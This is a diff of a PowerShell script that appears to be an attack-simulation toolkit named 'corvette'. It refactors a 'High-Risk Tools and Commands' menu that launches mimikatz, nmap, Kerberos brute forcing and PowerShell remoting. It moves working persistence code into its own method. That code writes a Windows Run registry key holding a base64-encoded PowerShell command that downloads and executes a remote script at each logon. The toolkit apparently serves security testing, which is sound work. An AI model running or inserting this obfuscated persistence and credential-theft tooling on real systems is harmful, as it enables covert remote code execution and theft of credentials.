@@ -374,9 +374,9 @@ function ChangeExecutableName (
 
 function StartEncodedScript (
     [string]$script,
-    [bool]$run_as = $False,
-    [bool]$wait = $False,
-    [bool]$no_exit = $False
+    [bool]$run_as = $false,
+    [bool]$wait = $false,
+    [bool]$no_exit = $false
 ) {
     $arg_list = @(
         "-e",
@@ -411,6 +411,7 @@ if ([string]::IsNullOrEmpty($dir)) {
     [string]$home_dir = Get-Location
 }
 if ($cargs) {
+    Write-Host $cargs.Length
     Start-Process -FilePath "@@@cmd_path@@@" -ArgumentList $cargs -Wait -NoNewWindow -WorkingDirectory $home_dir
 } else {
     Start-Process -FilePath "@@@cmd_path@@@" -Wait -NoNewWindow -WorkingDirectory $home_dir
@@ -1663,7 +1664,7 @@ if (`$sess -ne `$null) {
     Enter-PSSession -Session `$sess
 }
 "@
-            $trusted = $False
+            $trusted = $false
             $status = Get-Service -Name WinRM -ErrorAction SilentlyContinue
             if ($status -and $status.Status -eq "Running") {
                 if (Test-Path WSMan:\localhost\Client\TrustedHosts) {
@@ -1673,9 +1674,9 @@ if (`$sess -ne `$null) {
             }
             if (!$trusted -And (AskYesNo "Do you want to configure the local PsRemoting?")) {
                 $script = $script_configure, $script_pssess -join "`r`n"
-                StartEncodedScript $script -no_exit $True -run_as $True
+                StartEncodedScript $script -no_exit $true -run_as $true
             } else {
-                StartEncodedScript $script_pssess -no_exit $True
+                StartEncodedScript $script_pssess -no_exit $true
             }
             <#
             $run_configure = !$trusted -And (AskYesNo "Do you want to configure the local PsRemoting?")
@@ -1683,16 +1684,16 @@ if (`$sess -ne `$null) {
             if ($run_configure) {
                 if ($run_as_admin) {
                     $script = $script_configure, $script_pssess -join "`r`n"
-                    StartEncodedScript $script -no_exit $True -run_as $True
+                    StartEncodedScript $script -no_exit $true -run_as $true
                 } else {
-                    StartEncodedScript $script_configure -wait $True -run_as $True
-                    StartEncodedScript $script_pssess -no_exit $True
+                    StartEncodedScript $script_configure -wait $true -run_as $true
+                    StartEncodedScript $script_pssess -no_exit $true
                 }
             } else {
                 if ($run_as_admin) {
-                    StartEncodedScript $script_pssess -no_exit $True -run_as $True
+                    StartEncodedScript $script_pssess -no_exit $true -run_as $true
                 } else {
-                    StartEncodedScript $script_pssess -no_exit $True
+                    StartEncodedScript $script_pssess -no_exit $true
                 }
             }
             #>
@@ -4424,18 +4425,35 @@ class HighRiskToolsAndCommands : CommandBase {
     HighRiskToolsAndCommands([Properties]$props) : base($props) {
     }
 
+    hidden [void]EstablishPersistence() {
+        $path = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+        $name = "corvette"
+        $ret = Get-ItemProperty $path -name $name -ErrorAction SilentlyContinue
+        if ($null -ne $ret) {
+            Write-Host "$name already exists in $path"
+            if (AskYesNo "Do you want to remove it?") {
+                Remove-ItemProperty -Path $path -Name $name
+            }
+        } else {
+            $reg = New-ItemProperty -Force -Path $path -Name $name `
+                -Value "powershell -e JgAgACgAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKABbAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAXQA6ADoATgBlAHcAKAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHMAcABlAGEAcgBtAGkAbgAxADAALwBjAG8AcgB2AGUAdAB0AGUALwBiAGwAbwBiAC8AbQBhAGkAbgAvAGMAbwByAHYAZQB0AHQAZQAuAHAAcwAxAD8AcgBhAHcAPQB0AHIAdQBlACcAKQApACkA"
+            Write-Host "Persistence was achieved to ensure that 'corvette' runs on system startup at $path"
+        }
+    }
+
     hidden [void]OpenUserModeMenu() {
         Write-Host "High-Risk Tools and Commands"
         while ($true) {
             Write-Host "************************************"
             Write-Host " 0) Establish persistence for corvette"
             Write-Host " 1) Remote Access"
-            Write-Host " 2) Run mimikatz"
-            Write-Host " 3) Run mimikatz (Run as administrator)"
-            Write-Host " 4) Run nmap"
-            Write-Host " 5) Run Kerberos Brute Force"
-            Write-Host " 6) Run WildFire Test PE"
-            Write-Host " q) Exit"
+            Write-Host " 2) Enable PSRemoting (Run as administrator)"
+            Write-Host " 3) Run mimikatz"
+            Write-Host " 4) Run mimikatz (Run as administrator)"
+            Write-Host " 5) Run nmap"
+            Write-Host " 6) Run Kerberos Brute Force"
+            Write-Host " 7) Run WildFire Test PE"
+            Write-Host " 8) Exit"
             try {
                 :retry do {
                     $cmd = Read-Host "Please choose a menu item"
@@ -4444,36 +4462,31 @@ class HighRiskToolsAndCommands : CommandBase {
                             return
                         }
                         "0" {
-                            $path = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-                            $name = "corvette"
-                            $ret = Get-ItemProperty $path -name $name -ErrorAction SilentlyContinue
-                            if ($null -ne $ret) {
-                                Write-Host "$name already exists in $path"
-                                if (AskYesNo "Do you want to remove it?") {
-                                    Remove-ItemProperty -Path $path -Name $name
-                                }
-                            } else {
-                                $reg = New-ItemProperty -Force -Path $path -Name $name `
-                                    -Value "powershell -e JgAgACgAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKABbAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAXQA6ADoATgBlAHcAKAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHMAcABlAGEAcgBtAGkAbgAxADAALwBjAG8AcgB2AGUAdAB0AGUALwBiAGwAbwBiAC8AbQBhAGkAbgAvAGMAbwByAHYAZQB0AHQAZQAuAHAAcwAxAD8AcgBhAHcAPQB0AHIAdQBlACcAKQApACkA"
-                                Write-Host "Persistence was achieved to ensure that 'corvette' runs on system startup at $path"
-                            }
+                            $this.EstablishPersistence()
                         }
                         "1" {
                             [RemoteAccess]::New($this.props).Run()
                         }
                         "2" {
-                            [Mimikatz]::New($this.props).Run($false)
+                            $cargs = @(
+                                "-Command",
+                                "Enable-PSRemoting -force; Write-Host -NoNewLine 'Press any keys to continue...'; [System.Console]::ReadKey()"
+                            )
+                            Start-Process -FilePath "powershell.exe" -ArgumentList $cargs -verb runas
                         }
                         "3" {
-                            [Mimikatz]::New($this.props).Run($true)
+                            [Mimikatz]::New($this.props).Run($false)
                         }
                         "4" {
-                            [NmapMenu]::New($this.props).Run()
+                            [Mimikatz]::New($this.props).Run($true)
                         }
                         "5" {
-                            [KerberosBruteForce]::New($this.props).Run()
+                            [NmapMenu]::New($this.props).Run()
                         }
                         "6" {
+                            [KerberosBruteForce]::New($this.props).Run()
+                        }
+                        "7" {
                             [WildFireTestPE]::New($this.props).Run()
                         }
                         default {
@@ -4492,11 +4505,13 @@ class HighRiskToolsAndCommands : CommandBase {
         Write-Host "High-Risk Tools and Commands"
         while ($true) {
             Write-Host "************************************"
+            Write-Host " 0) Establish persistence for corvette"
             Write-Host " 1) Remote Access"
-            Write-Host " 2) Run mimikatz"
-            Write-Host " 3) Run nmap"
-            Write-Host " 4) Run Kerberos Brute Force"
-            Write-Host " 5) Run WildFire Test PE"
+            Write-Host " 2) Enable PSRemoting"
+            Write-Host " 3) Run mimikatz"
+            Write-Host " 4) Run nmap"
+            Write-Host " 5) Run Kerberos Brute Force"
+            Write-Host " 6) Run WildFire Test PE"
             Write-Host " q) Exit"
             try {
                 :retry do {
@@ -4505,19 +4520,25 @@ class HighRiskToolsAndCommands : CommandBase {
                         "q" {
                             return
                         }
+                        "0" {
+                            $this.EstablishPersistence()
+                        }
                         "1" {
                             [RemoteAccess]::New($this.props).Run()
                         }
                         "2" {
-                            [Mimikatz]::New($this.props).Run($false)
+                            Enable-PSRemoting -force
                         }
                         "3" {
-                            [NmapMenu]::New($this.props).Run()
+                            [Mimikatz]::New($this.props).Run($false)
                         }
                         "4" {
-                            [KerberosBruteForce]::New($this.props).Run()
+                            [NmapMenu]::New($this.props).Run()
                         }
                         "5" {
+                            [KerberosBruteForce]::New($this.props).Run()
+                        }
+                        "6" {
                             [WildFireTestPE]::New($this.props).Run()
                         }
                         default {
@@ -4572,7 +4593,7 @@ class Menu {
   ).ReadToEnd()
 ))
 "@
-                StartEncodedScript $script -run_as $True
+                StartEncodedScript $script -run_as $true
             }
             "1" {
                 [SetupTools]::New($this.props).Run()
